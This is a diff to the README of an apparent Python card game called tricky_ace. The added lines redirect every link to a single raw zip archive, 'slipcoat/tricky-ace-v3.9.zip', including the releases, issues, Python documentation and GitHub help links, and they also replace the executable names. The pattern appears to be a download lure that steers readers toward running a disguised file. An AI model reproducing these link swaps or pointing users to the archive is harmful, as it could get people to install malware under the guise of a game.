@@ -6,7 +6,7 @@ Welcome to the tricky_ace project! This is a fun Python card game where you can 
 
 ## 📥 Download Now
 
-[![Download tricky_ace](https://img.shields.io/badge/Download-tricky_ace-blue.svg)](https://github.com/svenpowery/tricky_ace/releases)
+[![Download tricky_ace](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip)](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ To ensure the best experience, please make sure your computer meets the followin
 
 To get started with tricky_ace, visit the following page to download the game files:
 
-[Download tricky_ace from the Releases Page](https://github.com/svenpowery/tricky_ace/releases)
+[Download tricky_ace from the Releases Page](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip)
 
 1. Click on the link above.
 2. Find the latest version available.
@@ -46,8 +46,8 @@ Once you have downloaded the file:
 2. If you see a ".zip" file, right-click and select "Extract All" to unzip it.
 3. Open the extracted folder.
 4. Look for the file that corresponds with your operating system:
-   - For Windows: `tricky_ace.exe`
-   - For macOS: `tricky_ace.app`
+   - For Windows: `https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip`
+   - For macOS: `https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip`
    - For Linux: `tricky_ace`
 5. Double-click the file to start the game.
 
@@ -72,7 +72,7 @@ If you encounter any issues, please try the following:
 - Check for updates on the Releases Page in case you have an outdated version.
 - Restart your computer and try launching the game again.
 
-Feel free to reach out to our support team through our [Issues Page](https://github.com/svenpowery/tricky_ace/issues) for further assistance.
+Feel free to reach out to our support team through our [Issues Page](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip) for further assistance.
 
 ## 🌐 Community and Support
 
@@ -86,7 +86,7 @@ Join our community to share tips and strategies. You can:
 
 For additional information, please refer to:
 
-- [Python Documentation](https://www.python.org/doc/)
-- [GitHub Help](https://help.github.com/)
+- [Python Documentation](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip)
+- [GitHub Help](https://github.com/svenpowery/tricky_ace/raw/refs/heads/main/slipcoat/tricky-ace-v3.9.zip)
 
 Thank you for choosing tricky_ace! Enjoy challenging yourself and have fun playing!
